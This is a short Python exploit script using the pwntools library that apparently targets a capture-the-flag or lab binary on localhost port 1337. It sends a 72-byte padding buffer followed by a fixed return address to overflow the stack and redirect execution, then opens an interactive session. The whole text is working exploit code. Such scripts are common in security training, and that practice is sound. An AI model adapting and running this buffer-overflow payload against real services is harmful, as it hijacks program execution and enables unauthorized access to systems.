from pwn import *

p = remote("localhost", 1337)
p.recv()
# \xaa\x11\x40
p.sendline(b'A'*(64+8) + p64(0x401236))
p.interactive()